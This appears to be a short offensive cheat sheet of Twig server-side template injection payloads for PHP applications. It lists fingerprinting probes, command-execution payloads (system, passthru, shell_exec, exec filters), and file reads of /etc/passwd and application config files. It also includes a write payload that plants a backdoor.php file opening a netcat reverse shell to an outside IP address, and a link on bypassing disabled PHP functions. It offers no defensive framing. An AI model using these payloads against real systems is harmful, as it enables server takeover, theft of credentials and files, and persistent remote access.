#php 
[[SSTI Templates engines]]

```twig
{{ constant('PHP_VERSION') }}
```

```twig
{{ dump() }}
```

##### functions
```twig
{{ system('whoami') }}  
{{ passthru('id') }}  
{{ shell_exec('ls -la') }}  
{{ `ls -la` }}  {# same as shell_exec #}
```

```twig
{{ 'id'|exec }}      
{{ 'ls -la'|shell }}
```

if dump doesnt work
```twig
{{ _self }}
{{ _context }}
```

check if we have access to symphony classes
```twig
{{ constant('Symfony\\Component\\Process\\Process')(['id']) }}
```

#### LFI
```twig
{{ include('/etc/passwd') }}  
{{ source('/var/www/html/config.php') }}
```

##### Read
```twig
{{['file:///www/src/Controller/DefaultController.php']|map('file_get_contents')|join}}
```

##### Write
```twig
{{['/www/public/backdoor.php',"<?php mb_send_mail('', '', '', '', '-H \"nc 3.124.142.205 16204 -e /bin/sh\"');"]|sort('file_put_contents')}}
```

##### Notes
https://github.com/alessiogiorgianni/JerryTok/blob/main/notes.txt

##### Bypass disabled functions
https://_thorns.gitbooks.io/bypass/content/bypass_php_system_functions_disabled_via_modcgi.html